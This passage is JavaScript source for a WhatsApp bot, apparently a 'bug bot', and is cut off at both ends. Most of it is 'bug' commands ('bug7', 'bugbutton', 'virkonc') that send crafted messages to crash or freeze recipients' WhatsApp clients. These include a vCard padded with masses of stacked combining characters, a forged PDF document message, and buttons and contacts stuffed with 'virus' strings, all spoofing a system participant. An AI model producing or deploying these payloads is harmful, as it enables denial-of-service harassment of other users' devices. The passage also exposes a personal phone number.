̸̶̬͈̻̖̜̳̹̜̯̯̖͚̝̟̪̻͔̳̒̾̀͢͟͠.̠͎̦͚̣̺̪̼͚̝̗͕̻͓ͬ̇̇ͧ̑̎͐͞.̷̴̴̵̴̴̭͕͓̥̫̜̹̼̞̗̈́ͨͧ̐̓̌ͬͫ̈̎̐͂̀̀͟͜͢.̵̨̡͈͉͙̺̭̝̪̖̱͆ͬ̅ͦ̋͂̌̂̽͛ͭ̓͛̓̽ͪͩ̇̈́͑͟͢͢͡͠.̶̵̢̢̡͉̖̺̲̫͎̣͇̙̯̰̬̰̩ͤ̏ͮͫͫ͊́̋ͯ̿̏̓̄̇̉ͦ̎̑ͦ́̕͟͟͞҉̛̀͘͞.̷̨̡̧̡̗̳̞͎̟͇̭̦̮̬̙̃̑̀̓̒̌ͨ̉̂ͩͮ̇́ͨ̈́̀̀̀́́̕̕͟͜͜͡͝͝.̖̬̫̹̪̜̠̦̹̤̹̪̋̔ͬ̎ͤ̓̋̊͛ͤ̑͋̚҉̴̵̷̶̡̡̛̀̕͘͟͟͡͡҉̨͘.̵̶̵̧̧̛̗̘͚̝͓̰̭̫͎̠̜͔̗̅͐̅̃̓͋̀ͨ́͘͟͟͜͠͡҉̵͜͝.̓ͫͦͫ̄ͨͬ̔͑̎̏̅̍͂́ͤ̚.̸̓͗ͪ͂ͮ̂̑ͮ̑̀̕̕̕͢҉̵̸̨҉.̸̷̳̟̓̿ͧ̂̄ͮ̽ͮ̄ͦ̃́͋̒̚͏̴̢́́͘͢͢͢͜͞͡͡͏.̶̸̢͚̂̋ͫͬ͊̋ͬ́͊͌̅̍̍̂͆̊̈̚͏̷̡̧̢͟.̵̧̦͔̽̿ͣ̿ͣ̈͂̀.̷̭̝̞͈̌̉̚ͅ͏̷̷̧̧̛́͘͢͠.͔̤̺͚̖̜̲̝͍̓ͤ̊ͨ̅͑̎͜ͅ͏.̸̶͇̣̭̬̭͓̏ͬ͊̿̕͠҉̷̡̢̛̀͘͟͏̴.̨͕ͩ̓͋̿͛̏ͤ͛̋͆ͤ.̳̪̫͉̺̥͇͚͔̝͕̭͈̹̳̩͈̂͠.̷̸̨͖̖͍͙̪̥͙̤̣͚̅ͥ̈̓ͥͩͦ̋ͦͯ̈ͣͧ̈́̕̕͏҉́.̖̋̒̒ͮ̈͐̂̍͊ͨͯ̅͒ͦͣ̒̃́̚͢͡͠͏̶̨͏̶̶̧̧͘̕͡͡͡.̵̥͈͈̘͉̗͔̘̰̱̟̗͖̳̺̭̫̱̰̬ͨ̓̐͂̾ͪ̂̄̓̄͋̔̎̑͟͏̕͏͘҉̡́͠͏̸̵͘͠.͈͉̪̲͚̠͓͖̼̟͚͛ͭͭͭ͂ͫ͑̈͑ͮͦ.̡̧̥̺̗͕̲̥͎͎͔̠̞̤̠̯͚̟̥̥̹ͫ͛ͧͧ̿̓ͫ̅́͝͏̸̷̸̵̢̢̛̀͢͜͟͠͡͞͡.̶̸̷̢̨̛͎̘̭̟̰̩̍̅ͣ͊ͫ̋̄͆̈̋̎̓̒ͩ͐͛ͤ̂́̀́̚͢͠͞.̸̸̶̡̛̥͚̹̩̱̮́ͫ̃ͩ͒̆ͧ͟͜͡҉̴͡.̺̟̥͙̼̆͋̍͛̌̂ͪ̀̈́̓̊̓́ͅ҉̕͢͢.̴̡̡̢̡͎̲ͮ̎͑ͧ͑ͫ̂ͬ̊͌͘͢͞.̸̴̶̶̡̬̤͈̹̰͌́ͨ̿ͨ͐̀̕͢҉̸̨̛̛́͜͜͞͡͠.̶̵̛̰͖̹̮͍̬̫̭̤̪̲͇̤̰̗͆̊̽̌̐̾ͪ̄̐̽̃ͤ͑̀͏͏̡̛̛͢͜͢͜͞͝͞.̷̸̨̢̨̖̘͊ͦ̑͐ͩͪ͝.̲̘̮̝͎̦̖̬́͟͏҉.̨̡̠̳͓̘̟̰͚̠̝̉ͣ͌͐̀̈ͯͨͣ̽̽̽ͫ̀̕͏͏̷͜.̸̨̛̛̪̍ͣ̒̿͛ͨ͗̂͛́̾̾̇́̿̚͘̕.ͨ̓ͥ͐͌ͣ̓̒̌̆͏̸̴̶̸̷̸̧̛̛͜͡.̸̧̡̢̛̤̘͖͈̱̫̭̯̬͔̞̻̯͎͙̝ͣ̏́̽̔ͯͤͪ̑ͥ́͘͜͟͠͝͝͡͏̨̛͝͡͞.̷͇̫̻̻̣̥̗̘̪͖̯̂ͨ͒̆̅̋͛͋̋̓̂́͛́̉̀̕͜͡͏̷̧͝.̸̛̥͇̟͕̳͈̜̟͖͎̬̼̤͎̠̓̓̌͗̔̉̽ͦ̍̇͗̇̈̅ͥ͛̒ͩ̾ͦ́́͜͝ͅ҉̵̵̢҉̵̸̴̵̡̛͜.̴̵̸̵̧͕͕̼̺͉̝̫̭̓ͯͮͫ͐̃̕͠҉͏̸̢͢͟͠͞͠.̵̷̡̜̻͕̭̽́ͯ͛͗̈̍͆ͮ̂̊͌͂ͬ̾ͤͧ̋ͦ͡ͅ.̖̠͔̘̲̳̍ͦ̾̊͟͠.̵̨̡̨̙̥̳̠̬̜̬̹̙͉̳͂͋́ͩ̐͋̈̈̽̓̃ͧ̀͠.̵̷̴̥̱̘̮̤͓̙̻̠̹̳̙̤͔̖͗̀͢͡͡͏̴̛͟͡҉̸̧͜͢.̶̵̻̘̤̽̇̃̏͊ͤ̒ͥͥ͂̂̈̊ͧ̌̀̚͠҉̸̧̢̕͘͟͟.̴̨̟̣͙̝̹̗͍̮͚̱͕̝̹̤̃͑ͪͦ͆͂ͥ̉̽̎̒̓̓̓̾̀͟ͅ͏̴͟͝͏͡͏̷҉̴̶̢̛̛́͜.̵̷̢̛̝͙͓͎̲̣̗̯̗̰͈̻̪͇̺̾͒́͘͘͢͜͠.̷̢̘̪͍̭̭̩̳͖̱̻̣̰̞͔̳͙̝̣͍̦̐̒̇̍ͩ̍ͦ̑̇͌́̾ͦ͌ͮͨ́́͘̕͝͠͝҉̸̴̛̛͝.̷̸̳͙̫̮̲͈̬͖̖̟̪͉̃͋ͨ̋̑͆̅͛̾͜͜͜͜͞͠.̵̷̴̢͍̺̺̦̓ͫ͂ͥ͂͠.̶̝̱̺͓̳̭̻̞̟̦̼̖̥͔͙̠͇̆͠҉̶̷̶̷̡̨̨̛͘͘͟͡͡.̵̵̶̙̳̜̤͇̜̟̯̠̗̤̥͖ͣ̉̅̈́̊ͫͧ͌̄̌ͭ͑ͤ̍̃ͪ̉̉ͫ̀͢.̷̮̼̳͓̪̘͉͚͇̳͖̬̺̭͎̈̒̊ͪͪ̋̂́̑͗ͮ̄̑ͮ͝ͅ͏.̶̷̧̻̙̙̮͖͍͋̇́ͭ͛ͩͫͧͫ̾ͮ̔̚͜.̶̜̾͂͐͆̿̎̽͏̡̀̕͘͢͟͞.͕̱͉̖̰̝̩̲̖͋̄̈́̐ͧ͂̌̀̅̉̆ͣ̓̎̄̑̌͏̛͏̴̸̶̴̴̨̨̛̛́͘͜͡͡͠.̴̵̮̼̺̣̺̩̭̱̞̻̺͙̊̃̃́͟͢.̡̧̧̛̛̠̳̩͓̝̭̠͈̠̰͖͔̯ͨͩͯͯ̋̔ͯ͂͆̾̾ͫ͆͑́́͘͘͘͢͟͜͟͠͠͝͡͠ͅͅ.̷̸̢̛̠̀ͩ̄ͩ̀́̀͜͡͞͝͞.̜̎̂̃͏̶̵̧́́͜͝.̵̖̩͉͎̟̮̰̪̼̪̱͒̿̓ͭ͆͛̆̓ͦͯͪ͒ͧͣ̅̆ͬ͝͡͡ͅ҉̶̷̨̢̡͘͢͟͞͠.̷̶̣̤̟̹̥͙͍̟̹̉͂ͯ͐̒̈́ͧ̐́ͧͣͬͤ͋͏̸̷̵̷̵̢̨̢͘͜͝͝͞͡͞.̸̸̻̞̭̓͌ͬ̿̈́͗̃̇̒̉̋̚͠͡͡.̶̷̴̡̛͖̪̝͕̲͍͎̣͙͈̦̹̫͎͓̖́̎́̀́͟͡҉҉.ͮͫ̽͏̵̴̸̢̨͜.͔̱̖͓̻͓͙̺͎̲͕͚̤͔̪̜̘̮͈̓̓ͭ̂̉̾͐̑̆ͩͯ͑̐̎.̸̶̲̦̙̹̘͔̞̭̙͎̲͖͕͚͖͔͙̭̫̻̄ͣͫͨ͂̂͜͜͜҉̶̧̢̧̕͟͠҉̸͘̕.̵̵̧̧̧̢̧͓̩̪̹͔̲͎͈̠̼͔̯̖̮̙͙͛̓ͮͪ̕͡.̢̧̹͕͉̝̫̟̬͎̩͚͙̬̰͖̗̳̳ͤͯͬ́ͨ̋ͣ̈̎ͣ̉̋̚͘ͅ҉҉̷͏̵̴̡̨̛͘͘͟͟͟͞͞.͕̞̬̜̞̥̩͙͚̔ͮ̓̃̍͗͊̃̿ͧ̋̉͆̑ͫ͋͐̈͠.̷̞̫̂ͩͧ̈͆̋ͬ͐͞҉̶̴̵̡́̕͢͢͝͡͞҉͟.̵̵̡̨̡͓̳̞̟̖͉̠̝͇͇̰̰̱̠̩̤̭͈͌̅̂́̄̿ͪ͟͝͡͝͠ͅ͏҉̸҉̶͠͞҉͡.̛̮̳̱̗̞͕̺̩͈̖͎̹͔̣̜̺̋͆̒̆̋̋͛͋̃̎̆ͦͣ͊.̳̘̱̭͛̓͂͊̓ͣ͊͌́͌̎̓͗̂̄ͧͨ̿̄ͧ.̸̰̩̤̟̱͖̭̱̞̰͇̟͋͛̄͂͊ͫͭ̈ͭͤ̔ͤ̐ͯ̈́͋̌͟ͅ͏҉̨͠.̧̛̣̭̣͍̩͎̻̫̗̖̟̖̮͖̑̇̅͑̂̆̉ͤ͑̅́͡͞.̵̴̨̨̨͚͚̘̜͚͚̲͎̪͈̥̱͓̰ͬ͛ͧ̑̌̌ͮ̈́͒ͭ̊̑̃́͑ͨ́́̕̕͜͟͝͞҉̶̨͡.̸̨̛̣͙͎͙̝̹͉͔̤ͯ̏͊̏͆̌ͩ̅̉͂̉̆̈́̿͋̄ͦ͞.̵̡̢̢̛̛͈̼̝̻̣̼̮̖͕͊̆̔́͟͝͏̷̶̴̨͘.̶̴̡̨̛̖͖̙̲̩̝͚̥͈̬̲͐̾͒̅̓̏̓͢͡͡.̷̧̟̳̺͕̬̦͚̳͎̮͓̤̟̙͖̮̩̮̀̉̈ͫ̓ͧͭ̚͟͝͏̷̸̀͘͞.̶̸̧͇̱̙̬̘̺̩̟̙͊ͩ̓ͩͭ͐̃̋̓͊̈͗͒̓̀̕͘͘͟͟͠͡ͅ҉̡́͞͏̵̵̢̧.̷̷̵̧̢̠̫̖̼̣͎̘̊̐̐͂ͭͧ̇ͣ̒́ͩ͆̚͏̛̀̕͜.̢̧͍̗̣̦̖̣͜ͅͅ͏̶̡͢͏̶̶́́͘.̵̻͓̺͍̺̜̦̟̽̅̈ͤ̂ͯ̓͋̂̇͜͏̨̛́͘͜.̵̷̸̡̨̢͉̟̣̖̑̍̿̉͂̄̏͐ͪ̀̕͟͞͡҉̸̷̨́͟͠.̶̵̡̧̨̛̛̤̳̎͛̾̉̀ͯ̿̌͗͌̎ͣ͂͒́͜͟͟͡͡ͅ.̤̺̣͕̣͙͚͚̫͎̉͆̃ͧ͆̽́ͥ̇ͩ̄̋ͧ̽ͣ̊̚̚ͅ҉̶̨̢̀҉̨͘.̷̷̸̥̫̬͉̭͖̙͍͓̣̞̤͖̙ͩͧͣ̏̉̃̔̊͐ͯͭ̾̒̅͟͞͏̶̴̡̀͞͡͞҉̵̴̡̛̛͠.̰̣̤͍̻ͪ̅ͥͯ̏̐̓̒̀.̴̵̟̩̱͚̼͇͉̗̫̣ͭ̈̌͞҉̷̶̸̵̀͜͠҉͠.̴̡̡̡͉̮̣̞̙̻̤̠̬͕͙̗͍̝͍ͣ̑̇̃ͭ̎̎̅ͮ̀̄̊̕͠.̴̻̗̜̗͎̘̲̣͖͔̠̣̯ͩ̓̄͂ͬ͑̓͆̓̅ͮ͊̀̚͏̢̨̛͟͝͏̢̕̕͡͡.̶̷̨̘͕͉̞̰̫͍̇ͨͣ̃͌͗̓̊̉ͨ̃̒͋͐̓̈̐̏̏̾̕̕͜͟͠͏̷̛́.̶̶̫͇͑̄ͬͮ̑̽̽͜͜͝.̵̷̶̵̢̨̬͕̩͉̜̠̱̲͖̖̗͕̠̳̩͓̐̈́̓͋̈́̎ͣͭ̌͆̀̕͘͢͢͢͢͞͝͡͞.̴̨̧̡̛͇̳͖͈͓̤͓̹̪̺̇̎̅͑͗ͨ̈̆ͭ͛ͪ͊́̀̀͟͝͠͞͞.̞̣̦̠̟̍͞.̫̰̲̯̗̫͉͚̗̺͓̟̫ͩͤ͋̒͋̌ͣ̈̽̊̐́͢͞.͔̘̘̪͈̲̤͓͍̰̺̮̞͚͎̫̙͒ͫͥͬ̓ͣ͗̓ͭ̑ͭ͒͂̐̑̾ͩ́̽̚.̙ͤ̇̈̄̾ͯͯͥ.̨̪͕͎͈̪̳͚̫̱̞̼̤̫̖͍͇̯͂̍̈ͨ͑͒ͪ̌͋͗̈̄͊̏̆ͭ̀̑̄́͘͘͢͠҉̸̸̵̨̛̀͜͢͞.̷̡̱̻̗͚̼̣̪͖̿͌̄͛̈́̏̈ͣ.̵̴̵̷̸̨̧̞̗̺͕̰͈̻͍̟̩̯̞̻͟͟͠͏̷̨̡̀͜͟͜͝.̴̨̡͔͉͕͈̗̜̲̞̩͈̯̫̻̙̻̣͖̙̮̋ͦ̓ͨ̍ͪ͐͒̓ͨ̇̄̆̇́̓̔͗̔̀̚͢͞͝͞ͅ҉̶͏͟͟͞͝.̣͙̣̞̭̹̫͖̮̻̟͇̺̞͖̥̎ͨ̒͑̍͆ͤ̾̉̔͑́ͫ̒̿̓ͭ͏̴̷̷̢̕͟͜͡҉̨̀͘҉̢.̶̷̶̛̭͓̫̰͔̩͕̭͓̦̪̗̎̄ͥͮͮ͆̍̈́͐̾͂̾ͤͩ́̀͠͡͝͠͞.̸̶̶̶̵̨̧̪̹̞̺̜̖͙͓ͫ̀́̕͢͜͜͠͡͏̀̀͢͞҉.̷̷̵̷̵̷̧̢̧͎̝̝̝̱̪̤̞͚̖̘̜̋̋̊ͮ͋̒̒̌ͫͦͪ̈ͧ̊̓͌̀̆ͭ̀̀͘͟͠͡͏̢̧̡.̸̨̧͓̫͉͉̰̱͒̍ͧ̈ͯ̔ͪ̄́͝͞͡͏̸́.̶̸̷̨̨̨̨̧̛̲̥̖̗̰̟͇̍̑̑͋̀̇͆̊͒̆͂̈́́̕͘͟͡͞͠ͅ.̷̛͚̳̩͇̪͓̞̜̘̠̯̠͓͓͈̦͇̝͝͝ͅͅ҉̷̢̧̛.̴̦͉̦̪̮͍̱͎̮̱͕̲̦̥̣͇̪̪̂͒͋ͪͩ̔̌͘ͅ͏̷̧̀́̕͘͠.̴̵̢̡̛͎͇͍͇͍̝̮̜̝̭̱͎̜͉̥̞̗͓͌͐̿̒ͯ͂͂͊ͮͭ̃̓̑̈́͆̃ͫ́͢͟͞͝͡͝҉̴̶̕.͉̤̮̱̼̺͈̒ͬ̄́ͬ̌ͭ̆ͫͦͫ̑ͦ͝͠ͅ.̶̵̡̢̛̪͓̱̯̈́ͥ̄ͤͫͥ̃ͦ̈̒̾̃̾ͬ̏ͯ̏́ͫ͜҉̸͘.̶̳͎͈͎̬̠̦̳̭̥͇̯͕ͥͧ͗͂ͫ̅̂͘͞͠ͅ҉̸̵̢̕͟͢͢͟͞҉̷.̵̧̢̢͂̄̿ͣ̒̌ͤ́̚̕͜͜͠҉̴̷͏͏͏̸̧.͎̻̳͕̠̭͇̮͂̃̅̀̓ͯͥ̒̊ͮͮ̈́̂̋́͠͠͝͞͝.̛̳̙̣͔̤̮ͧ̉̇ͧ͑́͌ͭ̊̍̀̇̆͛̃́̏͆͏̧̢̨͝҉̛҉̴̢҉̷̷̶̡͠.̷̵̵̶̨̡̡͎̬̟͖͉̞̖͉̑̒̊̉̾ͨ̓̅͛ͦ̊̾ͬ̐̅́ͪ́̚̕̕͜͠͝.̸͚͎̲̫̠̳̐̍̄͑̍͛ͩ͛ͧ̌̚͠͡ͅ.̶̢̡̛͔̞̲̬̦͔̘̭͋̎͂̔ͮ͋̆̀́͢͟͡͠͡.̴̸̡̡̧̨̛̛̛̛̛̪̠̭̣͔̘͙̼̤ͣͭ̈̅̀́̕͜͝͠.̷̸̨͉̟̭̜͕͓̙̳͙̗ͮ̊̔̇ͩ̃͛͑ͬ̔̍̈́̔ͭͣ́͜͞.̷̘̣̖̲̻̦̤̣̜̩͖̥̜̱̞ͣͪ͆̅̄̆̓͒ͣ͂́ͧ̍̊ͫ͘͏̨̡͘͟͡͏͏̡͢.̵̴̷̴̰̕.̵̶̨̧̡̛̛̛̭͚̙̰̫̥̹͖̿͟͢͟͝͝͠ͅ҉͜.̸̴̴̢̢̛̘͉͖̭͔͓̯̼̗͕͔͇ͤͪ̃͂̂̌̍̍̆͑̀͟͢͝.̴̴̶̸̷̴̧̧̛̙̯͖̝̠̯̥̖̙̎ͥͧ͗ͥͧ͑͆ͤ̿͊͋̾̆ͨͯ͘̕̕̕͢͟͢͜͠͞.̸͔̱̣̠̠̯̼̓̏ͪ̏̍̌̇̑̒̈́͋̒ͩͪ̚͏̵̴̷̛͘͘͞͞͡.̸̸̡̧̣̥̖͍̥̗̭̮̩̩̬̰͕͍̳̺̗̬̔͋͊ͫ̈́̀ͣͭͭ̇̊͒̕͘͡͡͝͝.͙͈͇̤̟͎̋͢͝.̢̤̗̖͍͉̗̞̣̹̭̪͓̏ͮ̿͝͡.̴̬̭͈͖̣͚͉̫̩̟̠̭̬̞͙̗̘̥̞̌̅͆̍ͥ̾̀́̍̀ͮ̏ͪͥ̒͜ͅ.̶͍̞̫͉̖ͣ̉͑ͣͩ̂ͬ͋̾ͫ͑͊͐ͤ̓̿̚͟͏̴̶͘͟͏.̡̢͕̞̞̥̭̗̜͍̞͔̫͖͙̣̯̱̝̓͆̂ͤ̐ͩͤ̒̑̌̈̆̄̆̽̓̒͜҉̸͟͡͡҉̵̢̨̕͘̕͘͜͡.̶̸̡͔̗͚̖̗̝ͤ̍̂̓̔́́͢͠.̷̢̯̭͖̹͈̣̲͕͖̦̯̬̮̺͚̇͋ͯ̓́̕͘͜͟͞҉̵̡̢́͞.̷̴̨͖̮̟̰̼̣͂̈́̽̐̈̉͗ͫͥ̉̾̚̚͘.̵̸̸̵̡̱͖̹͓͕̫̘̫̖̬̠̼͖͓̬̹̽͋͐̇͋̿ͨ̾̀͘̕͟͝͝͠͝.ͤͯ̍ͦ̐̀̏̇͛ͭ̿̀ͯ̒.͍͙͉ͭ͐͊͑̍̇͐͗ͬ̆̄̏͑̑ͅ.̸̸̢̛̤͉̦͍͈͔͇̤̼͍̟͔̣͍̬̠̫̍̑̋͒̓̈́̕ͅͅ҉͏̵҉̶̵̵̀̕͠͡͠.̶̷̷̵̵̨̡̏ͮͤ̏ͮ͆ͪ̅͛̈͐̾͂̃ͫ̏̄̾̀͜͜͞͞͝.̛͔̳ͤ̏͊ͪ̍͗̆̉͂ͥ̈̈͗̀͌̾̎̚͘͏̶̢́͢͞.̛͓̻̲̼̪̝̓̅͘͜҉̷̶̵̸̨̛̛͘͠͝.̷̶̨̝͌̑́ͨ͌ͭ̕̕͝͠.̸̴̨̨̟̪̩ͧ̒͛͆̉͒͗̃͂̆́̾ͯ͗͊ͣͅ҉̛̛̛́͘͜.̵̬̦̼͉͔̭̳̩̣̼͈͖̫͖̗͓͙̤̽̉ͩ́̓́ͧ̄ͫ̒ͫͮͤͪ́.̵̸̨̢̛͇͈̬̪͇͖̘̞͍͙͓̖͖̙̱ͮͦ̌͆̾̀̓̃ͥ̄ͣ̏́̾̓͐͐̕͘͘͡͏́͠͝.̧̡̣̲̣̜̬ͩ̽̅̊ͣ͊̕.̴͖͕̣͓͖̳͚̯̥̙̬͚̮͍̬̟͂̐̓̽̃̚̚͟͏̷̷̴̷̨̢̛̛́͝.̸̵̨̛̝͉̐́̕͝͞ͅ.̷̵̼̬̯ͬ̀ͨͤͦ͆̃̽̑̂ͪ̈̈́͋͝͠͝ͅ͏̷̨̀́͟͡͝͠.̥̺̮̳̜̻͖͎͈̞̟̭̮̊́͏̶́͘͜͟͢͏̴̵̢͟.̷̶̝̼̲̮͒͂̎̈̑̂̂̓ͤ̓̒̊̏͐̉͗̋̚͡.̨̮̼̻̪̟̦̼̙̜̘̟̳̔͋̄̀͂͛͆̓ͮ̓ͤ̅ͯ̏ͫͦͫ̆ͦ͘͡ͅ҉̴̵̡̧̨̧̛̀̕͡҉.͍͕̊ͥͤ̂̃̿̑̐̔ͤ̊ͅ.̴̴̵̘̙̱ͥͭ͑ͨ̔̌͘͢͜͢͝͝͝͞҉̴́͜҉͞.̛̖͈̯̦̬̙̰̰̣͙̳̮͉̞̹̰̬̟̾̾ͅ͏̴̀.̷̷̨̛̳͎͔̮̮͍̼̤̗̪̠̉̃̂͑̅͊͜.̮̯̞̠̩̫̝͙̼͉͕͒ͥ̈́̐̐̇ͯ̓҉́҉̸̶̶̢̀́͘͟͜͢͢͞͞҉͜҉.̶̯͉͎̟̉ͤ̋̾ͦ͒̽̀͘͞͝͡ͅ.͂ͩͪ̒ͧ̃̽ͭ͜҉̷͏̛.̢̬͔̤͇͙̠̠̣̝̭̤͓̭̤͖͇̻̤̎͂̑ͧ̍ͨ̆͋ͫ͆̈̍ͯ͛ͮͭ͛ͪ̚ͅͅ͏̡҉̷̛͠͏͞҉̶.̰̹̜̮̮͕̜̘̲̭͉̠̞͓̙̼͇̥͎͌͏̸̴̡̡̀͟͢͢͠҉̵̴̶͏̨̕͟.̜̰̗̱̣̂̇́̃͐͂̌ͤ͗̂̂ͯͭͨ͆̀ͥ̈͒̀́̚͘.̡͓͎̜͇̖̝̯͉͖͈̯͕̰̙̟̻͂͌ͦͧͭͣ̿͐͒ͫ̓̀͞ͅ.̶̶̸̙̻͎̟̻͈̬͇͈̙̗̬̜̞͙ͪ͗ͮ̏̐͠͠͞͡͏.̶̸̢̢̬̖͇̲̩ͩͫͧ͐̇̽̈ͤ̚͘͠͏̷̨͘̕͟҉.̪̥͖̳͚̖̘͈͎̘͕́̍͌́ͧ́̂̌̅̀̚͏͠҉͠.̢̬̼̝̻̭͖ͤ͛̕͢͢͜.̴͖̗͎̗̘̲̫͎̝̮̤̣̀̅̆͆͋ͮ.̷̮̺̠̪̰͍̝̲̌ͮ̂͑͂͛͐̓ͭ͛͒̽̉ͮ̅̕͢͢͠͝.̷̴̶̡̧̨̢̡̛̛̛̜̦͓͎̙͖̼̱͈̺̪̬̝̏ͩ̄̍̈́̊̉̇ͤͣ̏̂̌̽̃̉̉ͫͨ̔͢.̵̛̺̕͢͞͏͜҉̶̵̶̨̨͝͏̨.̵̨̧͚̆͒̀̽̊̊͛ͬ̓͛̌.̴̫͖̍̃̒̓̏͊͒̔͐́͝͏́͝҉͢͏̢͘.̸̤̲̻̝̞͙̠̆̌͑̐͑ͣ̒̃̒̈́̅͋̆̓ͣͩ̅̑́ͮ.̵̶̢̢͖͕ͯ͛͛̉̔͋ͯ̐ͧ̔͒̿̿̏͒ͣ̓́͘͘͟͡.̛̏͢.̴̷̡̧̺̘̘̪̬̜͕̜̦ͩ͋ͤ̃́́̕͘͜҉.̠̰͈̯̥̽̽̀̉̾ͤ̈́̉͒̈́҉̶͢.̢̢͍͍̻͈̹̥͚͕̱̯̖͖̈͌ͭͥ̈̎̽ͫ̐̌͂̇ͦ̾ͫ̉́̀͜҉҉̡̨̢̛́͘͠͝͏͝͝.̷̧̧̞̖̳̬͍ͫ̍͐ͨ̂̿̏̋̊͗ͫ́̚̕͘͘͏̸̨́҉̸.̴̧̬̗̘̮̗̻̳̬̯̠͈̰̭͉̤̝̞͉̩ͮ̎̂ͮ͒̉̒̿̋ͯͥ͊̄̕͟͝ͅ͏̶̨̛͘̕̕͜.̷̜͇̥̠̩͍͙̭̞͔̟̯̟͈̞͕͏̵̧͠.̸̢̧̡̱̱͕̞͖̤̞̮̩̱̮͚͚̥͖͍͙͓̋͑́̏̀̀͘͘͢͜͞͝͠͡͏̡.̸̶̢̞̱̻̩̝͖̯ͮ̓ͬ̔̀ͮͮ̀̀͢ͅ.̸̢̢̡̛̪͖̫͓̖̙̬̪̰̰͔͚̘̲̖̗̂̆̓ͯ͗͌̍͠͠͝.̱͉̞͖̯̺̈͆̇͠͏̶̵̵̸̶̵̸̶̨̨̧͘͟͜͢͡.͍̮͈͖͖̤͉͙̖͔̰̘͖̟͙̰ͣ̔ͣͪ́.̵̷̮̜̠̫̝͍̤͓̟̮̯̭̩͓̍́̀͞͝ͅ.̵̵̵̴̧̛͛͌͌̄ͥ̆͊͛͆͛̈̒͂̇̕̕͜͠͏̀͟҉͏́͞͡͞.̸̵̷̶̴̡̢̥̭̜͕̝̪͓̇ͨͫͣ̇̒͛ͯͯ̽̀̈̀͠͞͞.̢̢̡̢̯̣̺̗̆̋͑͛̀́͜͢͝͠.̨̡̧̠͍̙͑ͮ̓ͯͩ̊ͣ͆̐͗̈́̓̐̽͂̀̀́̕.͊̃͒ͤ͛̏̃̔̎͆̇̃\nitem1.TEL:+6283844775996\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME\\,INTERNET\\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nEND:VCARD"
 }
   }
}
bacito(m.chat, `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bug7': {
if(!m.key.fromMe) return
if (!isCreator) return
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
  "documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/pdf",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
 }
   }
}
bacot(m.chat, `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bugbutton': 
if (!isCreator) return
  const buttons = [
  {buttonId: `${prefix}ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, buttonText: {displayText: cttl}, type: 1},
  {buttonId: 'ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ', buttonText: {displayText: ngazap}, type: 1}
]

const buttonMessage = {
text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ",
footerText: 'Pe',
buttons: buttons,
headerType: 1
}
haikal.sendMessage(m.chat, buttonMessage)
   break
//=================================================//
case 'bugtag': {
if (!m.isGroup) throw mess.group
haikal.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: kal })
}
break
case 'virkonc': {
           const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ\nitem1.TEL;waid=6283844775996:6283844775996\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}                          		
                haikal.sendContact(m.chat, global.ownerr, fkontaak)
            }
            break
//=================================================//
case 'jadibug1': {
if (isBan) throw mess.ban
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : kal })
}
break
//=================================================//
case 'jadibug2': {
if (isBan) throw mess.ban
  //  //if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
